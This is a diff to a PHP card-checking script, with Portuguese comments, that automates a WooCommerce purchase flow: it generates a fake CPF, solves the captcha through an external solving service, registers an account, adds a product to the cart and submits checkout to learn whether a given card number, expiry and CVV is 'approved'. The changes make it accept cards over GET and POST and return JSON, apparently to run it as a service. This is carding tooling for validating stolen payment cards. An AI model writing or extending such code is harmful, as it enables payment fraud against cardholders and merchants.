@@ -119,7 +119,23 @@ $uuid = generateUUID();
 $cpf = gerarCPF();
 
 // ======================== ENTRADA DO CARTÃO ========================
-$lista = $_GET['lista'] ?? ($argv[1] ?? '');
+// Aceitar via GET, POST ou CLI
+$lista = $_GET['lista'] ?? $_POST['lista'] ?? ($argv[1] ?? '');
+
+// Se não houver dados, retornar JSON ou exibir mensagem
+if (empty($lista)) {
+    if (php_sapi_name() === 'cli') {
+        echo "❌ Erro: Dados do cartão incompletos. Formato: CC:MES:ANO:CVV\n";
+        echo "Uso: php faltaaddapi.php '5500000000000004:12:2025:123'\n";
+        exit(1);
+    } else {
+        http_response_code(400);
+        header('Content-Type: application/json');
+        echo json_encode(['erro' => 'Parâmetro lista é obrigatório. Formato: CC:MES:ANO:CVV']);
+        exit;
+    }
+}
+
 $parts = multiexplode([":", "|"], $lista);
 $cc = $parts[0] ?? '';
 $mes = ltrim($parts[1] ?? '', '0');
@@ -128,8 +144,15 @@ $cvv = $parts[3] ?? '';
 
 // Validação do cartão
 if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
-    echo "❌ Erro: Dados do cartão incompletos. Formato: CC:MES:ANO:CVV\n";
-    exit;
+    if (php_sapi_name() === 'cli') {
+        echo "❌ Erro: Dados do cartão incompletos. Formato: CC:MES:ANO:CVV\n";
+        exit(1);
+    } else {
+        http_response_code(400);
+        header('Content-Type: application/json');
+        echo json_encode(['erro' => 'Dados do cartão incompletos. Formato: CC:MES:ANO:CVV']);
+        exit;
+    }
 }
 
 // Divide o cartão
@@ -146,7 +169,7 @@ elseif ($primeiro == 5 || $primeiro == 2) $bandeira = 'mastercard';
 elseif ($primeiro == 3) $bandeira = 'amex';
 
 // ======================== CAPTCHA ========================
-$token = $_GET['token'] ?? ($argv[2] ?? null);
+$token = $_GET['token'] ?? $_POST['token'] ?? ($argv[2] ?? null);
 
 // Validar e resolver token automaticamente
 if (empty($token)) {
@@ -154,7 +177,7 @@ if (empty($token)) {
     $token = getCaptchaToken($apiKey, $websiteUrl, $websiteKey);
     if (!$token) {
         echo "❌ Erro: Falha ao resolver captcha. Verifique sua chave de API.\n";
-        exit;
+        exit(1);
     }
     echo "✅ Captcha resolvido com sucesso!\n";
 }
@@ -186,7 +209,7 @@ $response = curl_exec($ch);
 if (!$response) {
     echo "❌ Erro ao acessar home\n";
     if (file_exists($cookieFile)) unlink($cookieFile);
-    exit;
+    exit(1);
 }
 
 // 2. Product Page
@@ -197,7 +220,7 @@ $response = curl_exec($ch);
 if (!$response) {
     echo "❌ Erro ao acessar produto\n";
     if (file_exists($cookieFile)) unlink($cookieFile);
-    exit;
+    exit(1);
 }
 
 // Extrair dados da página de produto
@@ -230,7 +253,7 @@ $response = curl_exec($ch);
 if (!$response) {
     echo "❌ Erro ao realizar cadastro\n";
     if (file_exists($cookieFile)) unlink($cookieFile);
-    exit;
+    exit(1);
 }
 
 // 4. Add to Cart
@@ -241,7 +264,7 @@ $response = curl_exec($ch);
 if (!$response) {
     echo "❌ Erro ao adicionar ao carrinho\n";
     if (file_exists($cookieFile)) unlink($cookieFile);
-    exit;
+    exit(1);
 }
 
 // 5. Cart Page
@@ -252,7 +275,7 @@ $response = curl_exec($ch);
 if (!$response) {
     echo "❌ Erro ao acessar carrinho\n";
     if (file_exists($cookieFile)) unlink($cookieFile);
-    exit;
+    exit(1);
 }
 
 // 6. Checkout Page
@@ -263,7 +286,7 @@ $response = curl_exec($ch);
 if (!$response) {
     echo "❌ Erro ao acessar checkout\n";
     if (file_exists($cookieFile)) unlink($cookieFile);
-    exit;
+    exit(1);
 }
 
 // Extrair nonce de segurança
@@ -271,7 +294,7 @@ $process_nonce = buscar($response, 'name="woocommerce-process-checkout-nonce" va
 if (!$process_nonce) {
     echo "❌ Erro: Nonce de checkout não encontrado\n";
     if (file_exists($cookieFile)) unlink($cookieFile);
-    exit;
+    exit(1);
 }
 
 // 7. Final Checkout
@@ -310,20 +333,40 @@ $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 curl_close($ch);
 
 // ======================== RESULTADO ========================
-echo "\n" . str_repeat("=", 50) . "\n";
+$resultado = [];
 
 if (!$response) {
+    $resultado = [
+        'status' => 'erro',
+        'mensagem' => 'Falha na requisição final',
+        'cartao' => $cc,
+        'http_status' => $httpCode
+    ];
     echo "❌ Erro: Falha na requisição final\n";
 } else {
     $json = json_decode($response, true);
     
     if (isset($json['result']) && $json['result'] === 'success') {
+        $resultado = [
+            'status' => 'aprovada',
+            'mensagem' => 'Cartão aprovado com sucesso',
+            'cartao' => "$cc|$mes|$ano|$cvv",
+            'email' => $email,
+            'cpf' => $cpf,
+            'http_status' => $httpCode
+        ];
         echo "✅ APROVADA: $cc|$mes|$ano|$cvv\n";
         echo "   Email: $email\n";
         echo "   CPF: $cpf\n";
         echo "   HTTP Status: $httpCode\n";
     } else {
         $msg = isset($json['messages']) ? strip_tags($json['messages']) : (json_encode($json) ?: 'Erro desconhecido');
+        $resultado = [
+            'status' => 'reprovada',
+            'mensagem' => $msg,
+            'cartao' => "$cc|$mes|$ano|$cvv",
+            'http_status' => $httpCode
+        ];
         echo "❌ REPROVADA: $cc|$mes|$ano|$cvv\n";
         echo "   Motivo: $msg\n";
         echo "   HTTP Status: $httpCode\n";
@@ -331,6 +374,12 @@ if (!$response) {
 }
 
 echo str_repeat("=", 50) . "\n";
+
+// Retornar JSON se for requisição web
+if (php_sapi_name() !== 'cli') {
+    header('Content-Type: application/json');
+    echo json_encode($resultado);
+}
 
 // Limpeza
 if (file_exists($cookieFile)) {
